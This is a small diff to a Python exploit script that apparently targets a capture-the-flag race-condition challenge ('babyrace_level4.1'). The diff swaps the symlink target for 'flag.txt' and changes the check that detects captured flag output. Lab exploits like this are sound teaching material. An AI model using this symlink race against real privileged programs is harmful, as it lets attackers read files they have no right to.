@@ -6,7 +6,7 @@ from multiprocessing import Process, cpu_count
 import ctypes,os
 libc = ctypes.CDLL("libc.so.6", use_errno=True)
 path = '/home/hacker'
-TARGET=path +'/f'
+TARGET='flag.txt'
 SYMLINK=path+'/lk'
 CHALLENGE='/challenge/babyrace_level4.1'
 
@@ -38,7 +38,7 @@ def runner():
                 stderr=subprocess.STDOUT
             )
             print(out)
-            if b'pwn' in out:
+            if b'{' in out:
                 print(out.decode())
                 os._exit(0)
         except subprocess.CalledProcessError as e:
